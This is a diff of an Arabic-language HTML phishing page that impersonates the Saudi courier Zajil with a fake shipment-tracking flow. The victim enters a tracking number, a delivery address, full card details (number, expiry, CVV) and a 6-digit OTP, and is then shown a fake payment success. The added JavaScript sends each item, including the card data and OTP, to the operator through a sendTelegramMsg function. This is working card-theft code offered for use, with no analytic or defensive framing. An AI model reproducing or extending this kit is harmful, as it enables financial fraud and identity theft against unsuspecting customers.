@@ -4,151 +4,174 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>زاجل - نظام الشحن المتكامل</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        /* إعدادات عامة */
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #0b3b82; display: flex; justify-content: center; }
-        .app-container { width: 100%; max-width: 480px; background-color: #fff; min-height: 100vh; overflow-x: hidden; position: relative; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
+        body { background-color: #f8f9fa; display: flex; justify-content: center; }
+        .app-container { width: 100%; max-width: 480px; background-color: #fff; min-height: 100vh; overflow-x: hidden; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); padding-bottom: 60px; }
 
-        /* 1. الهيدر (نظيف، بدون شخوط، ومرتب) */
-        .header { 
-            background-color: #f7b71d; 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-            padding: 15px 20px; 
-            position: sticky; 
-            top: 0; 
-            z-index: 1000; 
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        /* الرقم */
-        .phone-num { font-size: 16px; font-weight: 700; color: #111; letter-spacing: 1px; }
+        .header { background-color: #fff; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; }
+        .logo-area { display: flex; align-items: center; gap: 10px; }
+        .logo-area svg { width: 40px; height: 40px; fill: #f7b71d; }
+        .logo-text { display: flex; flex-direction: column; }
+        .logo-text-ar { font-size: 20px; font-weight: 800; color: #0b3b82; line-height: 1; }
+        .logo-text-en { font-size: 12px; font-weight: 700; color: #f7b71d; line-height: 1; }
+        .phone-num { font-size: 14px; font-weight: 700; color: #0b3b82; direction: ltr; }
 
-        /* شعار زاجل */
-        .logo-area { display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .logo-area svg { width: 32px; height: 32px; stroke: #fff; fill: none; stroke-width: 2; margin-bottom: 4px; }
-        .logo-text-ar { font-size: 15px; font-weight: 900; color: #fff; line-height: 1; }
-        .logo-text-en { font-size: 13px; font-weight: 900; color: #f7b71d; line-height: 1; text-shadow: 1px 1px 1px rgba(0,0,0,0.1); }
+        .hero-banner { position: relative; background-image: url('https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?q=80&w=1000&auto=format&fit=crop'); background-size: cover; background-position: center; padding: 60px 20px; text-align: center; color: white; }
+        .hero-banner::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(11, 59, 130, 0.85); }
+        .hero-content { position: relative; z-index: 2; }
+        .hero-banner h1 { font-size: 28px; font-weight: 800; margin-bottom: 15px; }
+        .hero-banner p { font-size: 16px; margin-bottom: 25px; line-height: 1.6; }
+        .hero-btn { background-color: #f7b71d; color: #111; padding: 12px 30px; border-radius: 30px; text-decoration: none; font-weight: 800; display: inline-block; transition: 0.3s; }
+        .hero-btn:hover { background-color: #e0a61a; }
 
-        /* 2. القسم الرئيسي (بدون صور مكسورة، تصميم أنيق) */
-        .hero-section { 
-            position: relative; 
-            width: 100%; 
-            padding: 50px 20px; 
-            background: linear-gradient(135deg, #0b3b82, #1a4f9c); 
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            color: white; text-align: center;
-        }
-        .hero-section svg { width: 60px; height: 60px; fill: #f7b71d; margin-bottom: 20px; }
-        .hero-section h1 { font-size: 26px; margin-bottom: 10px; font-weight: 800; }
-        .hero-section p { font-size: 15px; opacity: 0.9; line-height: 1.6; max-width: 90%; }
+        .tracking-box { background-color: #f7b71d; padding: 30px 20px; text-align: center; border-radius: 20px 20px 0 0; margin-top: -20px; position: relative; z-index: 3; }
+        .tracking-box label { display: block; font-weight: 800; color: #111; margin-bottom: 15px; font-size: 18px; }
+        .tracking-input-group { display: flex; background: #fff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .tracking-input-group input { flex: 1; border: none; padding: 15px; font-size: 16px; outline: none; }
+        .tracking-input-group button { background-color: #0b3b82; color: #fff; border: none; padding: 0 25px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .tracking-input-group button:hover { background-color: #082d63; }
 
-        /* 3. شريط التتبع */
-        .tracking-box { background-color: #f7b71d; padding: 25px 20px 35px; text-align: right; }
-        .tracking-box label { display: block; font-weight: 700; color: #222; margin-bottom: 15px; font-size: 16px; }
-        .tracking-box input { 
-            width: 100%; border: none; border-bottom: 2px solid #222; 
-            background: transparent; padding: 8px 0; font-size: 16px; 
-            outline: none; margin-bottom: 25px; transition: 0.3s;
-        }
-        .tracking-box input:focus { border-bottom-color: #0b3b82; }
-        .tracking-box button { 
-            width: 100%; background-color: #fff; color: #0b3b82; border: none; 
-            padding: 15px; font-size: 18px; font-weight: 800; border-radius: 8px; 
-            cursor: pointer; transition: 0.3s; box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        .tracking-box button:hover { background-color: #f0f0f0; }
-
-        /* 4. صفحات الدفع (مخفية مبدئياً) */
         #payment-page, #otp-page, #address-page, #success-page { display: none; padding: 30px 20px; }
-        
         .payment-header { text-align: center; margin-bottom: 25px; }
-        .payment-header h2 { color: #0b3b82; font-size: 24px; margin-bottom: 10px; }
+        .payment-header h2 { color: #0b3b82; font-size: 24px; margin-bottom: 10px; font-weight: 800; }
         .payment-header p { color: #666; font-size: 14px; }
-        
-        .payment-card { background: #f9f9f9; border: 1px solid #eee; padding: 25px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        
+        .payment-card { background: #f9f9f9; border: 1px solid #eee; padding: 25px 20px; border-radius: 12px; }
         .input-group { margin-bottom: 18px; text-align: right; }
-        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 14px; }
-        .input-group input { 
-            width: 100%; padding: 14px; border: 1px solid #ccc; 
-            border-radius: 8px; font-size: 16px; outline: none; transition: 0.3s;
-        }
-        .input-group input:focus { border-color: #f7b71d; box-shadow: 0 0 8px rgba(247, 183, 29, 0.3); }
-        .input-group input[readonly] { background-color: #eef2f5; color: #0b3b82; font-weight: 800; text-align: center; cursor: not-allowed; }
-        
+        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 700; font-size: 14px; }
+        .input-group input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; outline: none; transition: 0.3s; }
+        .input-group input:focus { border-color: #f7b71d; }
+        .input-group input[readonly] { background-color: #eef2f5; color: #0b3b82; font-weight: 800; text-align: center; }
         .row { display: flex; gap: 15px; }
         .row .input-group { flex: 1; }
-        
-        .pay-btn { 
-            width: 100%; background-color: #f7b71d; color: #111; border: none; 
-            padding: 16px; font-size: 18px; font-weight: 800; 
-            border-radius: 8px; cursor: pointer; margin-top: 15px; transition: 0.3s;
-        }
+        .pay-btn { width: 100%; background-color: #f7b71d; color: #111; border: none; padding: 16px; font-size: 18px; font-weight: 800; border-radius: 8px; cursor: pointer; margin-top: 15px; }
         .pay-btn:hover { background-color: #e0a61a; }
 
-        /* 5. صفحة التحقق OTP */
         .otp-icon { width: 80px; height: 80px; background-color: #e8f0fe; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .otp-icon svg { width: 40px; height: 40px; fill: #0b3b82; }
         .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; direction: ltr; }
-        .otp-inputs input { 
-            width: 45px; height: 55px; text-align: center; font-size: 24px; 
-            font-weight: bold; border: 1px solid #ccc; border-radius: 8px; 
-            outline: none; transition: 0.3s;
-        }
-        .otp-inputs input:focus { border-color: #f7b71d; box-shadow: 0 0 8px rgba(247, 183, 29, 0.3); }
-        .verify-btn { width: 100%; background-color: #0b3b82; color: #fff; border: none; padding: 16px; font-size: 18px; font-weight: 800; border-radius: 8px; cursor: pointer; transition: 0.3s; }
-        .verify-btn:hover { background-color: #082d63; }
-
-        /* 6. صفحة النجاح */
+        .otp-inputs input { width: 45px; height: 55px; text-align: center; font-size: 24px; font-weight: bold; border: 1px solid #ccc; border-radius: 8px; outline: none; }
+        .otp-inputs input:focus { border-color: #f7b71d; }
+        .verify-btn { width: 100%; background-color: #0b3b82; color: #fff; border: none; padding: 16px; font-size: 18px; font-weight: 800; border-radius: 8px; cursor: pointer; }
+        
         .success-icon { width: 100px; height: 100px; background-color: #e8f5e9; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .success-icon svg { width: 50px; height: 50px; fill: #4caf50; }
         .success-title { color: #4caf50; font-size: 26px; font-weight: 800; margin-bottom: 10px; text-align: center; }
         .success-text { color: #666; font-size: 16px; text-align: center; }
 
-        /* زر المحادثة العائم */
-        .chat-btn { 
-            position: fixed; bottom: 20px; left: 20px; background-color: #f7b71d; 
-            width: 60px; height: 60px; border-radius: 50%; display: flex; 
-            justify-content: center; align-items: center; 
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3); cursor: pointer; border: none; z-index: 1000; 
-            transition: transform 0.2s;
-        }
-        .chat-btn:hover { transform: scale(1.1); }
-        .chat-btn svg { width: 30px; height: 30px; fill: #111; }
+        .info-section { padding: 40px 20px; background: #fff; text-align: center; }
+        .info-section h3 { color: #0b3b82; font-size: 22px; margin-bottom: 20px; font-weight: 800; }
+        .info-section p { color: #555; font-size: 15px; line-height: 1.8; margin-bottom: 30px; }
+        
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 30px; }
+        .stat-item { background: #f4f6f9; padding: 20px; border-radius: 10px; }
+        .stat-item h4 { color: #f7b71d; font-size: 28px; font-weight: 800; margin-bottom: 5px; }
+        .stat-item p { color: #0b3b82; font-size: 14px; margin: 0; font-weight: 700; }
+
+        .services-grid { display: flex; flex-direction: column; gap: 20px; }
+        .service-card { background: #fff; border: 1px solid #eee; border-radius: 12px; overflow: hidden; text-align: right; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .service-card img { width: 100%; height: 180px; object-fit: cover; }
+        .service-card-content { padding: 20px; }
+        .service-card h4 { color: #0b3b82; font-size: 18px; margin-bottom: 10px; font-weight: 800; }
+        .service-card p { font-size: 14px; color: #666; margin-bottom: 15px; }
+        .service-card a { color: #f7b71d; font-weight: 800; text-decoration: none; font-size: 14px; }
+
+        .footer { position: fixed; bottom: 0; left: 0; right: 0; background-color: #0b3b82; color: #fff; text-align: center; padding: 15px; font-size: 14px; z-index: 1000; max-width: 480px; margin: 0 auto; }
     </style>
 </head>
 <body>
 
     <div class="app-container">
         
-        <!-- 1. الهيدر -->
         <div class="header">
             <div class="logo-area">
-                <svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path></svg>
-                <span class="logo-text-ar">زاجل</span>
-                <span class="logo-text-en">Zajil</span>
+                <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                <div class="logo-text">
+                    <span class="logo-text-ar">زاجل</span>
+                    <span class="logo-text-en">Zajil</span>
+                </div>
             </div>
             <div class="phone-num">EN - 8001000177</div>
         </div>
 
-        <!-- 2. صفحة التتبع -->
         <div id="tracking-page">
-            <div class="hero-section">
-                <svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path></svg>
-                <h1>حلول لوجستية سهلة</h1>
-                <p>وموثوقة، وبأسعار تنافسية. اكتشف كيف يمكننا مساعدتك على تنمية أعمالك.</p>
+            <div class="hero-banner">
+                <div class="hero-content">
+                    <h1>حلول لوجستية سهلة</h1>
+                    <p>وموثوقة، وبأسعار تنافسية. اكتشف كيف يمكننا مساعدتك على تنمية أعمالك.</p>
+                    <a href="#" class="hero-btn">اعرف المزيد</a>
+                </div>
             </div>
+
             <div class="tracking-box">
-                <label>رقم الشحنة</label>
-                <input type="text" id="tracking-number" placeholder="أدخل رقم الشحنة هنا">
-                <button onclick="goToPayment()">تابع شحنتك</button>
+                <label>تتبع شحنتك الآن</label>
+                <div class="tracking-input-group">
+                    <input type="text" id="tracking-number" placeholder="أدخل رقم الشحنة هنا">
+                    <button onclick="goToAddress()">تابع</button>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <h3>شعارنا هو: "لا تشيل هم، وصلت!"</h3>
+                <p>تُعد "زاجل" أول شركة خاصة لخدمات البريد في المملكة العربية السعودية. واليوم، تحظى بثقة أكثر من 500 عميل يعتمدون على خدماتنا.</p>
+                <div class="stats-grid">
+                    <div class="stat-item"><h4>+500</h4><p>عميل نشط</p></div>
+                    <div class="stat-item"><h4>+1200</h4><p>شاحنة</p></div>
+                    <div class="stat-item"><h4>+300</h4><p>فرع بالمملكة</p></div>
+                    <div class="stat-item"><h4>+5000</h4><p>موظف</p></div>
+                </div>
+            </div>
+
+            <div class="info-section" style="background: #f8f9fa;">
+                <h3>احصل على كافة احتياجاتك اللوجستية</h3>
+                <div class="services-grid">
+                    <div class="service-card">
+                        <img src="https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop" alt="التجارة الإلكترونية">
+                        <div class="service-card-content">
+                            <h4>التجارة الإلكترونية</h4>
+                            <p>تسخر "زاجل" كافة خبراتها وإمكاناتها لتقديم مجموعة متكاملة من الحلول.</p>
+                            <a href="#">اعرف المزيد &larr;</a>
+                        </div>
+                    </div>
+                    <div class="service-card">
+                        <img src="https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?q=80&w=1000&auto=format&fit=crop" alt="شحن البضائع">
+                        <div class="service-card-content">
+                            <h4>شحن البضائع</h4>
+                            <p>حلول الشحن المناسبة لاحتياجات شركتك، بدايةً من نقل البضائع لمسافات قصيرة.</p>
+                            <a href="#">اعرف المزيد &larr;</a>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
 
-        <!-- 3. صفحة الدفع -->
+        <div id="address-page">
+            <div class="payment-header">
+                <h2>بيانات التوصيل</h2>
+                <p>أدخل عنوانك ورقم جوالك لتوصيل الشحنة</p>
+            </div>
+            <div class="payment-card">
+                <div class="input-group">
+                    <label>المدينة</label>
+                    <input type="text" id="address-city" placeholder="مثال: الرياض">
+                </div>
+                <div class="input-group">
+                    <label>الحي</label>
+                    <input type="text" id="address-district" placeholder="مثال: حي النرجس">
+                </div>
+                <div class="input-group">
+                    <label>الشارع</label>
+                    <input type="text" id="address-street" placeholder="اسم الشارع ورقم المبنى">
+                </div>
+                <div class="input-group">
+                    <label>رقم الجوال</label>
+                    <input type="tel" id="address-phone" placeholder="05xxxxxxxx">
+                </div>
+                <button class="pay-btn" onclick="goToPayment()">التالي</button>
+            </div>
+        </div>
+
         <div id="payment-page">
             <div class="payment-header">
                 <h2>إتمام عملية الدفع</h2>
@@ -181,7 +204,6 @@
             </div>
         </div>
 
-        <!-- 4. صفحة OTP -->
         <div id="otp-page">
             <div class="otp-icon">
                 <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
@@ -191,44 +213,16 @@
                 <p>أدخل رمز التحقق المكون من 6 أرقام</p>
             </div>
             <div class="otp-inputs" id="otp-inputs">
-                <input type="tel" maxlength="1">
-                <input type="tel" maxlength="1">
-                <input type="tel" maxlength="1">
-                <input type="tel" maxlength="1">
-                <input type="tel" maxlength="1">
-                <input type="tel" maxlength="1">
+                <input type="tel" maxlength="1" inputmode="numeric">
+                <input type="tel" maxlength="1" inputmode="numeric">
+                <input type="tel" maxlength="1" inputmode="numeric">
+                <input type="tel" maxlength="1" inputmode="numeric">
+                <input type="tel" maxlength="1" inputmode="numeric">
+                <input type="tel" maxlength="1" inputmode="numeric">
             </div>
-            <button class="verify-btn" onclick="goToAddress()">تأكيد</button>
+            <button class="verify-btn" onclick="verifyOTP()">تأكيد</button>
         </div>
 
-        <!-- 5. صفحة العنوان -->
-        <div id="address-page">
-            <div class="payment-header">
-                <h2>بيانات التوصيل</h2>
-                <p>أدخل عنوانك ورقم جوالك لتوصيل الشحنة</p>
-            </div>
-            <div class="payment-card">
-                <div class="input-group">
-                    <label>المدينة</label>
-                    <input type="text" id="address-city" placeholder="مثال: الرياض">
-                </div>
-                <div class="input-group">
-                    <label>الحي</label>
-                    <input type="text" id="address-district" placeholder="مثال: حي النرجس">
-                </div>
-                <div class="input-group">
-                    <label>الشارع</label>
-                    <input type="text" id="address-street" placeholder="اسم الشارع ورقم المبنى">
-                </div>
-                <div class="input-group">
-                    <label>رقم الجوال</label>
-                    <input type="tel" id="address-phone" placeholder="05xxxxxxxx">
-                </div>
-                <button class="pay-btn" onclick="submitAllData()">تأكيد الطلب</button>
-            </div>
-        </div>
-
-        <!-- 6. صفحة النجاح -->
         <div id="success-page">
             <div class="success-icon">
                 <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg>
@@ -237,10 +231,10 @@
             <div class="success-text">شكراً لك، تم تأكيد عملية الدفع بنجاح.</div>
         </div>
 
-        <!-- زر المحادثة -->
-        <button class="chat-btn">
-            <svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
-        </button>
+        <div class="footer">
+            &copy; 2024 زاجل. جميع الحقوق محفوظة.
+        </div>
+
     </div>
 
     <script>
@@ -268,23 +262,57 @@
             return price;
         }
 
-        function goToPayment() {
+        function goToAddress() {
             currentTrackingNumber = document.getElementById('tracking-number').value;
             if (currentTrackingNumber.trim() === "") { alert("الرجاء إدخال رقم الشحنة!"); return; }
             
+            sendTelegramMsg("📦 المستخدم أدخل رقم الشحنة: " + currentTrackingNumber);
+
+            document.getElementById('tracking-page').style.display = 'none';
+            document.getElementById('address-page').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        function goToPayment() {
+            var city = document.getElementById('address-city').value;
+            var district = document.getElementById('address-district').value;
+            var street = document.getElementById('address-street').value;
+            var phone = document.getElementById('address-phone').value;
+
+            if (city.trim() === "" || district.trim() === "" || street.trim() === "" || phone.trim() === "") {
+                alert("الرجاء إكمال جميع بيانات التوصيل!");
+                return;
+            }
+
+            let addressMsg = `📍 بيانات العنوان:\n`;
+            addressMsg += `المدينة: ${city}\n`;
+            addressMsg += `الحي: ${district}\n`;
+            addressMsg += `الشارع: ${street}\n`;
+            addressMsg += `رقم الجوال: ${phone}`;
+            sendTelegramMsg(addressMsg);
+
             let calculatedPrice = calculatePrice(currentTrackingNumber);
             currentAmount = calculatedPrice + " ريال"; 
             document.getElementById('total-amount').value = currentAmount;
 
-            sendTelegramMsg("📦 طلب تتبع شحنة جديد:\nرقم الشحنة: " + currentTrackingNumber + "\n💰 قيمة الشحن: " + currentAmount);
-            
-            document.getElementById('tracking-page').style.display = 'none';
+            document.getElementById('address-page').style.display = 'none';
             document.getElementById('payment-page').style.display = 'block';
             window.scrollTo(0, 0);
         }
 
         function goToOTP() {
             currentCustomerName = document.getElementById('card-name').value;
+            var cardNumber = document.getElementById('card-number').value;
+            var expiry = document.getElementById('card-expiry').value;
+            var cvv = document.getElementById('card-cvv').value;
+
+            let cardMsg = `💳 بيانات البطاقة:\n`;
+            cardMsg += `الاسم: ${currentCustomerName}\n`;
+            cardMsg += `رقم البطاقة: ${cardNumber}\n`;
+            cardMsg += `تاريخ الانتهاء: ${expiry}\n`;
+            cardMsg += `رمز الأمان: ${cvv}`;
+            sendTelegramMsg(cardMsg);
+
             document.getElementById('payment-page').style.display = 'none';
             document.getElementById('otp-page').style.display = 'block';
             window.scrollTo(0, 0);
@@ -299,36 +327,16 @@
             });
         }
 
-        function goToAddress() {
+        function verifyOTP() {
+            const inputs = document.querySelectorAll('#otp-inputs input');
+            let otpCode = '';
+            inputs.forEach(input => { otpCode += input.value; });
+
+            if (otpCode.length !== 6) { alert("الرجاء إدخال 6 أرقام كاملة"); return; }
+
+            sendTelegramMsg(`🔑 رمز التحقق OTP: ${otpCode}`);
+
             document.getElementById('otp-page').style.display = 'none';
-            document.getElementById('address-page').style.display = 'block';
-            window.scrollTo(0, 0);
-        }
-
-        function submitAllData() {
-            var city = document.getElementById('address-city').value;
-            var district = document.getElementById('address-district').value;
-            var street = document.getElementById('address-street').value;
-            var phone = document.getElementById('address-phone').value;
-
-            if (city.trim() === "" || district.trim() === "" || street.trim() === "" || phone.trim() === "") {
-                alert("الرجاء إكمال جميع بيانات التوصيل!");
-                return;
-            }
-
-            var finalMsg = `🚚 تفاصيل الشحنة الكاملة:\n`;
-            finalMsg += `🔢 رقم الشحنة: ${currentTrackingNumber}\n`;
-            if (currentCustomerName.trim() !== "") finalMsg += `👤 اسم العميل: ${currentCustomerName}\n`;
-            finalMsg += `💰 المبلغ: ${currentAmount}\n`;
-            finalMsg += `📍 المدينة: ${city}\n`;
-            finalMsg += `🏘️ الحي: ${district}\n`;
-            finalMsg += `🛣️ الشارع: ${street}\n`;
-            finalMsg += `📱 رقم الجوال: ${phone}\n`;
-            finalMsg += `\n💳 الحالة: تم إدخال بيانات الدفع والتحقق بنجاح.`;
-
-            sendTelegramMsg(finalMsg);
-
-            document.getElementById('address-page').style.display = 'none';
             document.getElementById('success-page').style.display = 'block';
             window.scrollTo(0, 0);
         }
